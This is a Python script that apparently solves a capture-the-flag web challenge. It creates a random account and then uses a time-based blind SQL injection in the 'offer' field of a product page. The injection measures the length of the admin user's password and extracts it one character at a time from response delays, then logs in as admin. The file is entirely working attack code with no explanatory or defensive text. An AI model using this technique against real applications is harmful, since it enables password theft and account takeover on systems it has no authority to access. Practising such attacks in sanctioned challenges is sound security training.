import requests
from datetime import datetime
import string
import random

def random_string(length):
    str = ''.join(random.choice(string.ascii_letters) for i in range(length))
    return str

base_url = 'http://cyberchallenge.disi.unitn.it:50050'

aux_username = random_string(20)
auxpassword = random_string(20)

signup_body = {'username' : aux_username, 'password': auxpassword, 'confirm-password': auxpassword}
r = requests.post(base_url+'/register', signup_body)
print(f"Created new account: {aux_username} - {auxpassword}")

login_body = {'username': aux_username, 'password': auxpassword}
r = requests.post(base_url+'/login', login_body)

invalid_login = '<div class="flash-message error">'
if(invalid_login in r.text):
    print("Login Failed")
    raise Exception("Login Failed")
else:
    print("Login Successful")
    cookies = r.cookies

login_body = {'username': 'Serom', 'password':'Password'}
target_username = "admin"

r = requests.post(base_url+'/login', login_body)
cookies = r.cookies

length_found = False
length = 0
while(not length_found):
    injection= f"AND (LENGTH((SELECT password FROM user WHERE username = '{target_username}')) \
        = {length}) AND sleep(2)"
    injection_body = {'offer': '9999999999999 ' + injection}

    time_init = datetime.now()
    r = requests.post(base_url+'/product/5', injection_body, cookies=cookies)
    time_response = datetime.now()-time_init
    print(f"{length} - {time_response.total_seconds()}")

    if(time_response.total_seconds() > 2):
        length_found = True
        print(f"Password Length: {length}")

    else:
        length += 1

counter = 0
target_password = ""
while(counter < length):

    for char in string.printable:

        if(char == '%' or char == '_'):
            print(f"{char} - Skip Wildcard")
            continue

        current_try = target_password + char

        injection= f"AND (SELECT (SELECT password FROM user WHERE username = '{target_username}') \
            like BINARY '{current_try}%') AND sleep(2)"
        injection_body = {'offer': '15 ' + injection}

        time_init = datetime.now()
        r = requests.post(base_url+'/product/5', injection_body, cookies=cookies)
        time_response = datetime.now()-time_init
        print(f"{char} - {time_response.total_seconds()}")

        if(time_response.total_seconds() > 2):
            counter += 1
            target_password += char
            print(f"Current Password: {target_password}, Current Length: {counter}")
            break


print("Complete Password: " + target_password)

login_body = {'username': target_username, 'password': target_password}
r = requests.post(base_url+'/login', login_body)

if(invalid_login in r.text):
    print("Login Failed")
else:
    print("Login Successful")